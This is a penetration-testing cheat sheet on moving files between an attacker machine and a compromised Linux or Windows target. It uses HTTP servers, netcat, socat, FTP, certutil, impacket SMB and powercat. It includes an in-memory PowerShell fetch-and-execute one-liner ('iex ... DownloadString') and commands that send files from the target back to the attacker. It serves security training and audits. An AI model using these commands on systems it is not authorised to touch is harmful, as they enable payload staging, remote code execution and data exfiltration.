---
description: >-
  In this section I’m going to enumerate difference methods to transfer files
  such us exploits or outputs of some scripts from our attacker machine to the
  target and viceversa.
---

# Transfering Files 📤

In order to perform our work we have the need of transfer some files and this post collects some of this methods. Let’s see, these are some possibilities of environment that we can find during our audits.

## Linux 📤 to Linux 📥

### HTTP

First we need to start our **server** with python:

```bash
python3 -m http.server port
python -m SimpleHTTPServer port
php -S 0.0.0.0:port
ruby -run -e httpd . -p port
busybox httpd -f -p port
```

And download our files with Linux basics on the **target**:

```bash
wget http://ip-addr:port/file.name
curl http://ip-addr:port/file.name -o file.name
axel -a -n 20 -o file.name https://ip-addr:port/filen.name

#Freebsd
fetch -o file.name -q -R http://ip-addr:port/file.name
```

### Netcat / Socat

There are more ways with different protocols or programs to transfer our files:

```bash
nc -lp port > file.name
sudo socat TCP4-LISTEN:port,fork file:file.name
```

And on the target:

```bash
nc -w 3 ip-addr port < file.name
sudo socat TCP4:ip-addr:port file:file.name,create
```

### FTP \(File Transfer Protocol\)

First we need to start our ftp server, in this case I will use the Python module **pyftpdlib**, that allows you to set up our ftp server very quickly. To install you run the following command:

```bash
sudo apt-get install python-pyftpdlib
```

And start the **server**:

```bash
python -m pyftpdlib -p 21
```

Finally you can download the file on the **target** with:

```bash
wget ftp://ip-addr/file.name [--ftp-user=user] [--ftp-password=password]
axel -a -n 20 -o file.name ftp://ip-addr:port/filen.name
```

### Base64 Encoding

This is not the best solution beause you will need to Copy & Paste the output, and if you need to transfer a big file could be so tedious. Btw this are the commands:

```bash
base64 file.name
```

Copy the result and paste on your machine inside some quotes:

```bash
base64 -d "ZmxhZ3tINGNrMW5nTjB0ZXN9Cg==" > file.name
```

## Linux 📤 to Windows 📥

### HTTP

First we need to start our **server** with python:

```bash
python3 -m http.server port
python -m SimpleHTTPServer port
```

And download our files with **Windows** basics on the **target**:

#### Via CMD:

```bash
certutil -urlcache -f "http://ip-addr:port/file.name" file.name
powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file.name', 'file.name')
```

#### Via Powershell:

```bash
(New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file.name', 'file.name')
```

#### Import Powershell Script without storing in memory

```text
iex (New-Object System.Net.Webclient).DownloadString('http://ip-addr:port/file.ps1')
```

### SMB

Server Message Block \(SMB\) is a network protocol that allows us share files, printers, etc, between nodes that are Microsoft Windows.

To start a **smb server** you need to invoke smbserver.py class from [impacket](https://github.com/SecureAuthCorp/impacket).

```bash
python smbserver.py NAME FOLDER
```

And simply copy the file in the share volume to the target:

```bash
copy \\ip-addr\NAME\file.name .\file.name
```

Maybe there are some others ways to transfer files between Linux and Windows, but with these methods is more than enough to do our job!

## Windows 📤 to Linux 📥 

This section will be similar to previous one. 

### HTTP

If the target have python installed you can start the **server** in the same way: 

_\(Be careful on windows the python script in python2.7 is `http.server` and not `SimpleHTTPServer`\)_

```bash
python -m http.server
```

And download our files with Linux basics on the **target**:

```bash
wget http://ip-addr:port/file.name
curl http://ip-addr:port/file.name -o file.name
```

### SMB

In that case the **smb server** will also start on the attacker's machine \(Linux\). To start a **smb server** you need to invoke smbserver.py class from [impacket](https://github.com/SecureAuthCorp/impacket):

```bash
python smbserver.py NAME FOLDER
```

But the differece will be the order of copy arguments:

```bash
copy .\file.name \\ip-addr\NAME\file.name
```

### Powercat

Powercat is essentially the powershell version of netcat. First need to install in yout kali Machine to download the script:

{% hint style="info" %}
**Installation**: sudo apt install powercat
{% endhint %}

Then you will find the script in the following directory:

* `/usr/share/windows-resources/powercat/powercat.ps1`

Onced transfered the script and imported the module, start the listener on the kali 

```text
nc -lp port > file.name
```

And execute the following command to send the desired file.

```text
powercat -c ip-addr -p port -i file.name
```

## References:

* [https://ironhackers.es/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/](https://ironhackers.es/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/)
* [https://guide.offsecnewbie.com/transferring-files](https://guide.offsecnewbie.com/transferring-files)
* [https://medium.com/@PenTest\_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65](https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65)


